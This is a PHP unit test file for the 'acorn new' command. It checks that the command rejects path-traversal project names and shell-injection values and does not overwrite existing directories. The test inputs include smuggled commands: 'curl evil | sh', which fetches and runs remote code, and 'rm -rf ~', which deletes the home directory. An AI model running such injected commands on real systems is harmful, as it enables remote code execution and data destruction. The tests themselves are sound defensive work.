<?php

declare(strict_types=1);

namespace Tests\Commands;

use Myerscode\Acorn\Testing\Interactions\InteractsWithCommands;
use Tests\BaseTestCase;

/**
 * Covers the input-validation and overwrite guards of `acorn new`.
 *
 * These assert the early-return security branches (invalid name/version,
 * refusing to clobber an existing directory) without invoking composer.
 */
final class NewAppCommandTest extends BaseTestCase
{
    use InteractsWithCommands;

    public function testRefusesToOverwriteAnExistingDirectoryWithoutForce(): void
    {
        $existing = sys_get_temp_dir() . '/acorn_new_existing_' . uniqid();
        mkdir($existing, 0700, true);

        try {
            $output = $this->call('new', [
                'project' => 'Arthur',
                'location' => $existing,
            ]);

            $this->assertStringContainsString('already exists', $output);
            // The directory is untouched.
            $this->assertDirectoryExists($existing);
        } finally {
            @rmdir($existing);
        }
    }

    public function testRejectsAProjectNameThatTraverses(): void
    {
        $output = $this->call('new', ['project' => '../../tmp/pwn']);

        $this->assertStringContainsString('Invalid project name', $output);
    }

    public function testRejectsAProjectNameWithShellMetacharacters(): void
    {
        // Previously interpolated straight into a /bin/sh -c string.
        $output = $this->call('new', ['project' => 'Rupert"; curl evil | sh; "']);

        $this->assertStringContainsString('Invalid project name', $output);
    }

    public function testRejectsAVersionWithShellMetacharacters(): void
    {
        $output = $this->call('new', [
            'project' => 'Gerald',
            'location' => sys_get_temp_dir() . '/acorn_new_' . uniqid(),
            '--from' => 'dev-main"; rm -rf ~; "',
        ]);

        $this->assertStringContainsString('Invalid --from version', $output);
    }
}
